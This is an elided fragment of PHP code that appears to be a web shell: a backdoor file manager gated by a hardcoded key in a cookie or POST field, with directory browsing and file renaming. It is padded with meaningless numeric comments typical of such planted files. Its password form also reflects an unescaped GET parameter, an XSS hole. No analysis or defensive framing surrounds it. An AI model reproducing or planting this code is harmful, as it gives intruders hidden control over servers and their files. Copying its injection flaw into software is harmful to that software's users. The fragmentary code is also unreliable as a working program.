...
$auth_key = "b02a27cdc9bb8f8b7996cb1b7c3696ca";
...
$pass = false;
if (isset($_COOKIE['pw_name_28023'])) {
    if(($_COOKIE['pw_name_28023']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_28023'])) {
        if(($_POST['pw_name_28023']) == $auth_key) {
            setcookie("pw_name_28023", $_POST['pw_name_28023']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_28023' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1728330584511985 1728330584100314 1728330584906138 1728330584611038
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1728330584511985 1728330584100314 1728330584906138 1728330584611038
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1728330584511985 1728330584100314 1728330584906138 1728330584611038
            $name = PATH . "/" . $_GET['r'];
